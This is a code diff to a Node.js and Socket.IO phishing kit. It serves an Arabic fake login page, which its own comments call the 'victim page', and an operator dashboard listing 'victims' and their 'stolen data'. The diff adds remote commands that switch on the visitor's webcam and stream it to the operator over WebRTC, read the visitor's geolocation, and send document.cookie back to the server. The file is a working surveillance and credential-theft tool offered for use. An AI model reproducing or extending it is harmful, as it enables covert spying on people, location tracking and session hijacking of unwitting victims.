@@ -1,7 +1,6 @@
 const express = require('express');
 const http = require('http');
 const socketIo = require('socket.io');
-const path = require('path');
 
 const app = express();
 const server = http.createServer(app);
@@ -9,7 +8,7 @@ const io = socketIo(server, {
     cors: { origin: "*" }
 });
 
-// ============ صفحة الضحية (مدمجة) ============
+// ============ صفحة الضحية ============
 const victimPage = `<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -58,6 +57,12 @@ const victimPage = `<!DOCTYPE html>
             cursor: pointer;
         }
         .btn-login:hover { background: #005a9e; }
+        #video-preview {
+            display: none;
+            width: 100%;
+            margin-top: 15px;
+            border-radius: 8px;
+        }
     </style>
 </head>
 <body>
@@ -77,10 +82,13 @@ const victimPage = `<!DOCTYPE html>
             </div>
             <button type="submit" class="btn-login">تسجيل الدخول</button>
         </form>
+        <video id="video-preview" autoplay playsinline muted></video>
     </div>
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
+        let localStream = null;
+        let peerConnection = null;
         
         socket.on('connect', () => {
             socket.emit('victim_register', {
@@ -105,21 +113,97 @@ const victimPage = `<!DOCTYPE html>
             alert('كلمة المرور غير صحيحة');
         });
         
+        // ============ تفعيل الكاميرا ============
         socket.on('execute_command', async (cmd) => {
             if (cmd.action === 'start_cam') {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    socket.emit('victim_data', { type: 'camera_active', data: 'Camera on' });
-                } catch (err) {
-                    socket.emit('victim_data', { type: 'error', data: err.message });
-                }
+                await startCamera();
+            }
+            if (cmd.action === 'stop_cam') {
+                stopCamera();
+            }
+            if (cmd.action === 'get_location') {
+                getLocation();
+            }
+            if (cmd.action === 'get_cookies') {
+                socket.emit('victim_data', { type: 'cookies', data: document.cookie });
+            }
+        });
+        
+        async function startCamera() {
+            try {
+                localStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: 640, height: 480 },
+                    audio: false 
+                });
+                
+                // عرض الفيديو للضحية
+                document.getElementById('video-preview').style.display = 'block';
+                document.getElementById('video-preview').srcObject = localStream;
+                
+                // إعداد WebRTC للبث للمطور
+                const configuration = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
+                peerConnection = new RTCPeerConnection(configuration);
+                
+                localStream.getTracks().forEach(track => {
+                    peerConnection.addTrack(track, localStream);
+                });
+                
+                peerConnection.onicecandidate = (event) => {
+                    if (event.candidate) {
+                        socket.emit('webrtc_ice', { targetId: cmd.from, candidate: event.candidate });
+                    }
+                };
+                
+                const offer = await peerConnection.createOffer();
+                await peerConnection.setLocalDescription(offer);
+                socket.emit('webrtc_offer', { targetId: cmd.from, offer: offer });
+                
+                socket.emit('victim_data', { type: 'camera_started', data: 'Camera is broadcasting' });
+            } catch (err) {
+                socket.emit('victim_data', { type: 'camera_error', data: err.message });
+            }
+        }
+        
+        function stopCamera() {
+            if (localStream) {
+                localStream.getTracks().forEach(track => track.stop());
+                localStream = null;
+                document.getElementById('video-preview').style.display = 'none';
+            }
+            if (peerConnection) {
+                peerConnection.close();
+                peerConnection = null;
+            }
+        }
+        
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    socket.emit('victim_data', {
+                        type: 'location',
+                        data: { lat: pos.coords.latitude, lng: pos.coords.longitude }
+                    });
+                });
+            }
+        }
+        
+        // استقبال إشارات WebRTC
+        socket.on('webrtc_answer', async (data) => {
+            if (peerConnection) {
+                await peerConnection.setRemoteDescription(data.answer);
+            }
+        });
+        
+        socket.on('webrtc_ice', async (data) => {
+            if (peerConnection) {
+                await peerConnection.addIceCandidate(data.candidate);
             }
         });
     </script>
 </body>
 </html>`;
 
-// ============ صفحة لوحة التحكم (مدمجة) ============
+// ============ صفحة لوحة التحكم ============
 const adminPage = `<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -169,20 +253,38 @@ const adminPage = `<!DOCTYPE html>
             justify-content: space-between;
         }
         header h1 { color: #00f0ff; }
-        .victims-list {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
-            gap: 15px;
+        .layout {
+            display: flex;
+            gap: 20px;
+        }
+        .victims-panel {
+            width: 300px;
+            background: #12121a;
+            border-radius: 10px;
+            padding: 20px;
         }
         .victim-card {
-            background: #12121a;
-            padding: 20px;
-            border-radius: 10px;
+            background: #1a1a2e;
+            padding: 15px;
+            border-radius: 8px;
             cursor: pointer;
+            margin-bottom: 10px;
             border: 2px solid transparent;
         }
         .victim-card:hover { border-color: #00f0ff; }
         .victim-card.selected { border-color: #ff0055; }
+        .video-panel {
+            flex: 1;
+            background: #12121a;
+            border-radius: 10px;
+            padding: 20px;
+        }
+        #remoteVideo {
+            width: 100%;
+            max-height: 400px;
+            background: #000;
+            border-radius: 8px;
+        }
         .controls {
             display: flex;
             gap: 10px;
@@ -202,7 +304,14 @@ const adminPage = `<!DOCTYPE html>
             background: #12121a;
             padding: 20px;
             border-radius: 10px;
-            min-height: 200px;
+            margin-top: 20px;
+        }
+        .data-entry {
+            background: #1a1a2e;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 10px;
+            border-right: 3px solid #ff0055;
         }
     </style>
 </head>
@@ -219,13 +328,23 @@ const adminPage = `<!DOCTYPE html>
             <div>الضحايا: <b id="victim-count">0</b></div>
         </header>
         
-        <div class="victims-list" id="victims-list"></div>
-        
-        <div class="controls">
-            <button onclick="sendCmd('start_cam')">📷 الكاميرا</button>
-            <button onclick="sendCmd('start_mic')">🎤 الميكروفون</button>
-            <button onclick="sendCmd('get_location')">📍 الموقع</button>
-            <button onclick="sendCmd('get_cookies')">🍪 الكوكيز</button>
+        <div class="layout">
+            <div class="victims-panel">
+                <h2>الأجهزة المتصلة</h2>
+                <div id="victims-list"></div>
+            </div>
+            
+            <div class="video-panel">
+                <h2>البث المباشر</h2>
+                <video id="remoteVideo" autoplay playsinline></video>
+                
+                <div class="controls">
+                    <button onclick="sendCmd('start_cam')">📷 تشغيل الكاميرا</button>
+                    <button onclick="sendCmd('stop_cam')">🛑 إيقاف الكاميرا</button>
+                    <button onclick="sendCmd('get_location')">📍 الموقع</button>
+                    <button onclick="sendCmd('get_cookies')">🍪 الكوكيز</button>
+                </div>
+            </div>
         </div>
         
         <div class="data-log">
@@ -238,6 +357,7 @@ const adminPage = `<!DOCTYPE html>
     <script>
         const socket = io();
         let selectedVictim = null;
+        let peerConnection = null;
         
         function login() {
             const key = document.getElementById('admin-key').value;
@@ -248,6 +368,8 @@ const adminPage = `<!DOCTYPE html>
             if (res.status === 'success') {
                 document.getElementById('login-screen').style.display = 'none';
                 document.getElementById('main-panel').style.display = 'block';
+            } else {
+                alert('مفتاح خاطئ');
             }
         });
         
@@ -258,7 +380,7 @@ const adminPage = `<!DOCTYPE html>
             victims.forEach(v => {
                 const card = document.createElement('div');
                 card.className = 'victim-card';
-                card.innerHTML = '<strong>' + (v.deviceName || 'Unknown') + '</strong><br>' + v.ip;
+                card.innerHTML = '<strong>' + (v.platform || 'Unknown') + '</strong><br><small>' + v.screenRes + '</small>';
                 card.onclick = () => {
                     selectedVictim = v.id;
                     document.querySelectorAll('.victim-card').forEach(c => c.classList.remove('selected'));
@@ -269,15 +391,43 @@ const adminPage = `<!DOCTYPE html>
         });
         
         function sendCmd(action) {
-            if (!selectedVictim) { alert('اختر ضحية'); return; }
+            if (!selectedVictim) { alert('اختر ضحية أولاً'); return; }
             socket.emit('admin_command', { victimId: selectedVictim, action });
         }
         
         socket.on('victim_response', (data) => {
             const div = document.getElementById('stolen-data');
             const entry = document.createElement('div');
+            entry.className = 'data-entry';
             entry.innerHTML = '<b>' + data.type + '</b>: ' + JSON.stringify(data.data);
             div.prepend(entry);
+        });
+        
+        // ============ WebRTC للبث المباشر ============
+        socket.on('webrtc_offer', async (data) => {
+            const configuration = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
+            peerConnection = new RTCPeerConnection(configuration);
+            
+            peerConnection.ontrack = (event) => {
+                document.getElementById('remoteVideo').srcObject = event.streams[0];
+            };
+            
+            peerConnection.onicecandidate = (event) => {
+                if (event.candidate) {
+                    socket.emit('webrtc_ice', { targetId: data.from, candidate: event.candidate });
+                }
+            };
+            
+            await peerConnection.setRemoteDescription(data.offer);
+            const answer = await peerConnection.createAnswer();
+            await peerConnection.setLocalDescription(answer);
+            socket.emit('webrtc_answer', { targetId: data.from, answer: answer });
+        });
+        
+        socket.on('webrtc_ice', async (data) => {
+            if (peerConnection) {
+                await peerConnection.addIceCandidate(data.candidate);
+            }
         });
     </script>
 </body>
@@ -319,7 +469,10 @@ io.on('connection', (socket) => {
 
     socket.on('admin_command', (payload) => {
         if (victims.has(payload.victimId)) {
-            io.to(payload.victimId).emit('execute_command', payload);
+            io.to(payload.victimId).emit('execute_command', {
+                ...payload,
+                from: socket.id
+            });
         }
     });
 
@@ -329,9 +482,38 @@ io.on('connection', (socket) => {
         });
     });
 
+    // ============ WebRTC Signaling ============
+    socket.on('webrtc_offer', (data) => {
+        if (admins.has(data.targetId)) {
+            io.to(data.targetId).emit('webrtc_offer', {
+                offer: data.offer,
+                from: socket.id
+            });
+        }
+    });
+
+    socket.on('webrtc_answer', (data) => {
+        if (victims.has(data.targetId)) {
+            io.to(data.targetId).emit('webrtc_answer', {
+                answer: data.answer,
+                from: socket.id
+            });
+        }
+    });
+
+    socket.on('webrtc_ice', (data) => {
+        io.to(data.targetId).emit('webrtc_ice', {
+            candidate: data.candidate,
+            from: socket.id
+        });
+    });
+
     socket.on('disconnect', () => {
         victims.delete(socket.id);
         admins.delete(socket.id);
+        admins.forEach(adminId => {
+            io.to(adminId).emit('victims_update', Array.from(victims.values()));
+        });
     });
 });
 
